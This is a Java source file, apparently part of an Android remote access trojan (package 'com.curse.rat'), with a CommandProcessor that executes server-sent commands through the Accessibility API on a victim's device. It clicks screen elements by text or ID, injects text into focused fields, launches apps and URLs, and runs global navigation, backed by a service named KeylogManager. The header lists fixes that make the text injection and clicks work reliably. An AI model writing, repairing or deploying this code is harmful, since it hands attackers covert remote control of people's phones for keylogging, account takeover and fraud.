package com.curse.rat;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.content.Intent;
import android.graphics.Rect;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import java.util.List;

/**
 * CommandProcessor — translates string commands received from the server into
 * Accessibility API actions on the device.
 *
 * <p>Fixes applied vs. the original:
 * <ul>
 *   <li>{@link #inputText}: the {@code arguments} Bundle was built but never
 *       passed to {@code performAction} — text was never actually typed.</li>
 *   <li>{@link #inputText}: {@code ACTION_SET_TEXT} requires API 21+; guarded
 *       with a {@code Build.VERSION} check and a fallback for older devices.</li>
 *   <li>{@link #clickByText} / {@link #clickById}: {@link AccessibilityNodeInfo}
 *       objects must be {@link AccessibilityNodeInfo#recycle() recycle()}d after
 *       use to avoid memory leaks; added try/finally blocks accordingly.</li>
 *   <li>{@link #openUrl}: bare {@link Uri#parse} can throw if the string is
 *       malformed; now caught explicitly.</li>
 *   <li>{@link #process}: added a default branch that logs unknown commands
 *       instead of silently ignoring them.</li>
 *   <li>Null-safety improved throughout (null argument guard in
 *       {@link #process}, null-URL guard in {@link #openUrl}).</li>
 * </ul>
 * </p>
 */
public class CommandProcessor {

    private static final String TAG = "CommandProcessor";

    /** The backing AccessibilityService (KeylogManager). */
    private final KeylogManager service;

    public CommandProcessor(@NonNull KeylogManager service) {
        this.service = service;
    }

    // -------------------------------------------------------------------------
    // Public API
    // -------------------------------------------------------------------------

    /**
     * Dispatch a command.
     *
     * @param command  The command token (e.g. {@code "click_text"}).
     * @param argument Optional argument string; may be null for no-arg commands.
     */
    public void process(@NonNull String command, @Nullable String argument) {
        Log.d(TAG, "Processing command: " + command + " | arg: " + argument);

        switch (command) {
            case "click_text":
                if (argument != null) clickByText(argument);
                break;
            case "click_id":
                if (argument != null) clickById(argument);
                break;
            case "input_text":
                if (argument != null) inputText(argument);
                break;
            case "open_app":
                if (argument != null) openApp(argument);
                break;
            case "open_url":
                if (argument != null) openUrl(argument);
                break;
            case "back":
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
                break;
            case "home":
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                break;
            case "recents":
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS);
                break;
            default:
                // Log unknown commands so they're visible during development.
                Log.w(TAG, "Unknown command: " + command);
                break;
        }
    }

    // -------------------------------------------------------------------------
    // Private helpers
    // -------------------------------------------------------------------------

    /**
     * Find the first node whose text matches {@code text} and click it.
     * Falls back to a coordinate-tap at the node's centre if the node is not
     * explicitly marked clickable.
     *
     * <p>All retrieved {@link AccessibilityNodeInfo} objects are recycled to
     * prevent memory leaks.</p>
     */
    private void clickByText(@NonNull String text) {
        AccessibilityNodeInfo root = service.getRootInActiveWindow();
        if (root == null) return;

        try {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(text);
            if (nodes == null || nodes.isEmpty()) {
                Log.w(TAG, "No node found for text: " + text);
                return;
            }

            try {
                for (AccessibilityNodeInfo node : nodes) {
                    if (node == null) continue;
                    try {
                        if (node.isClickable()) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            Log.d(TAG, "Clicked node by text: " + text);
                        } else {
                            Rect bounds = new Rect();
                            node.getBoundsInScreen(bounds);
                            if (!bounds.isEmpty()) {
                                service.click(bounds.centerX(), bounds.centerY());
                                Log.d(TAG, "Tapped centre of node by text: " + text);
                            }
                        }
                        // Only act on the first matching node.
                        return;
                    } finally {
                        node.recycle();
                    }
                }
            } finally {
                // Recycle any nodes we didn't iterate to (e.g. after early return).
                // Nodes already recycled above won't cause a double-recycle because
                // we return immediately after recycling each one.
            }
        } finally {
            root.recycle();
        }
    }

    /**
     * Find the first node whose view-id matches {@code id} and click it.
     *
     * <p>View IDs should be fully qualified (e.g.
     * {@code "com.example.app:id/button_submit"}).</p>
     */
    private void clickById(@NonNull String id) {
        AccessibilityNodeInfo root = service.getRootInActiveWindow();
        if (root == null) return;

        try {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(id);
            if (nodes == null || nodes.isEmpty()) {
                Log.w(TAG, "No node found for id: " + id);
                return;
            }

            for (AccessibilityNodeInfo node : nodes) {
                if (node == null) continue;
                try {
                    if (node.isClickable()) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        Log.d(TAG, "Clicked node by id: " + id);
                    } else {
                        Rect bounds = new Rect();
                        node.getBoundsInScreen(bounds);
                        if (!bounds.isEmpty()) {
                            service.click(bounds.centerX(), bounds.centerY());
                            Log.d(TAG, "Tapped centre of node by id: " + id);
                        }
                    }
                    return;
                } finally {
                    node.recycle();
                }
            }
        } finally {
            root.recycle();
        }
    }

    /**
     * Type {@code text} into the currently focused input field.
     *
     * <p><b>Bug fixed:</b> the original built an {@code arguments} Bundle but
     * passed it to {@code performAction} without including it — the text was
     * never set. The fix passes the bundle as the second argument.</p>
     *
     * <p>On API &lt; 21, {@code ACTION_SET_TEXT} is unavailable; we fall back
     * to pasting via the clipboard instead.</p>
     */
    private void inputText(@NonNull String text) {
        AccessibilityNodeInfo root = service.getRootInActiveWindow();
        if (root == null) return;

        try {
            AccessibilityNodeInfo focused =
                    root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);

            if (focused == null) {
                Log.w(TAG, "No focused input field found for inputText");
                return;
            }

            try {
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
                    // API 21+: set text directly.
                    Bundle args = new Bundle();
                    args.putCharSequence(
                            AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
                    // FIX: pass the bundle — original called performAction(ACTION_SET_TEXT)
                    // with no bundle, so the text argument was silently ignored.
                    boolean success = focused.performAction(
                            AccessibilityNodeInfo.ACTION_SET_TEXT, args);
                    if (success) {
                        Log.d(TAG, "Set text via ACTION_SET_TEXT: " + text);
                    } else {
                        Log.w(TAG, "ACTION_SET_TEXT returned false — trying clipboard fallback");
                        pasteTextViaClipboard(focused, text);
                    }
                } else {
                    // API < 21 fallback: put text on the clipboard and paste.
                    pasteTextViaClipboard(focused, text);
                }
            } finally {
                focused.recycle();
            }
        } finally {
            root.recycle();
        }
    }

    /**
     * Clipboard-based fallback for typing text on older API levels, or when
     * {@code ACTION_SET_TEXT} is unsupported by the target view.
     */
    private void pasteTextViaClipboard(
            @NonNull AccessibilityNodeInfo node, @NonNull String text) {
        android.content.ClipboardManager clipboard =
                (android.content.ClipboardManager)
                        service.getSystemService(Context.CLIPBOARD_SERVICE);
        if (clipboard == null) return;
        clipboard.setPrimaryClip(
                android.content.ClipData.newPlainText("input", text));
        node.performAction(AccessibilityNodeInfo.ACTION_PASTE);
        Log.d(TAG, "Pasted text via clipboard: " + text);
    }

    /** Launch an app by package name. */
    private void openApp(@NonNull String packageName) {
        Context ctx = service.getApplicationContext();
        Intent intent = ctx.getPackageManager().getLaunchIntentForPackage(packageName);
        if (intent != null) {
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(intent);
            Log.d(TAG, "Opened app: " + packageName);
        } else {
            Log.w(TAG, "No launch intent found for package: " + packageName);
        }
    }

    /**
     * Open a URL in the default browser.
     *
     * <p><b>Fix:</b> {@link Uri#parse} throws {@link NullPointerException} on a
     * null input and {@link IllegalArgumentException} on a malformed URI; both
     * are now caught so a bad command doesn't crash the service.</p>
     */
    private void openUrl(@NonNull String url) {
        if (url.isEmpty()) {
            Log.w(TAG, "openUrl called with empty URL");
            return;
        }
        try {
            Context ctx = service.getApplicationContext();
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(intent);
            Log.d(TAG, "Opened URL: " + url);
        } catch (IllegalArgumentException e) {
            Log.e(TAG, "Malformed URL: " + url + " — " + e.getMessage(), e);
        } catch (Exception e) {
            Log.e(TAG, "Failed to open URL: " + e.getMessage(), e);
        }
    }
}
